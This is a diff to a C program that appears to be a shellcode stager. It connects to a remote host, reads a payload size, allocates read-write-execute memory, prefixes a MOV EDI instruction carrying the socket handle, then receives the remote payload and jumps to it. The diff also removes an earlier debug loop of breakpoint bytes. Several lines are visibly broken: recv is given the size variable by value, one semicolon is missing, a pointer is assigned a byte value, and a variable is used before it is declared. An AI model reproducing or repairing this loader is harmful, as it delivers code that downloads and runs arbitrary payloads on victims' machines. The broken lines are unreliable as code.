@@ -54,33 +54,30 @@ int main() {
   printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
   connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
 
+  // Get payload size
+  u_long size = 0;
+  res = recv( ConnectSocket, size, 4, 0 );
+  printf("Payload size: %d\n", size)
+  
   // Receive data from port;
   char buf[BUF_LEN] = "";
-  char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  char *rwx = (char *)VirtualAlloc(NULL, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   char *index = rwx;    // Pointer to track position in the payload buffer.
   int res = 0;          // Hold return value of recv().
-  u_long size = 0;      // Holds the size of the payload.
   int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
-
-  printf("Receiving\n");
+  
+  // Add assembly to make put our socket in EDI
+  index = 0xBF;
+  memcpy(index + 1, &ConnectSocket, 4);
+  index += 5;
+  
+  // Receive the payload
+  printf("Receiving payload.\n");
   do {
     res = recv( ConnectSocket, index, BUF_LEN, 0 );
-    if (rcvd == 0) { size = *(u_long*)rwx; printf("Payload size: %d\n", size);}
     index += res;
     rcvd += res;
   } while (size > rcvd);
-
-  //closesocket(ConnectSocket);
-
-  index = rwx;
-  int i = 0;
-  do {
-    *index = 204;
-    index ++;
-    i++;
-  } while (i < 4);
-
-
 
   printf("Executing payload.\n");
   // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
@@ -88,10 +85,3 @@ int main() {
   func = (int (*) ()) rwx;
   (int) (*func) (); 
 }
-
-
-//{
-//  int (*funct)();
-//  funct = (int (*)()) code;
-//  (int)(*funct)();
-//}
